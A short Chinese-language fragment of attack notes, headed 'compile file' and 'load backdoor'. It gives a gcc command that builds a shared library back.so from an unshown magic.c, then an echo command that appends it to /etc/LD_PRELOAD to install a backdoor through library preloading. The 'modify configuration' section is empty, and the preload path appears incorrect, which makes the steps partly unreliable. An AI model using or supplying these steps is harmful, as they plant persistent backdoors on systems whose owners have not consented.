# 修改配置



# 编译文件

gcc -shared -fpic -o back.so magic.c

# 载入后门

echo "/usr/lib/back.so" >> /etc/LD_PRELOAD
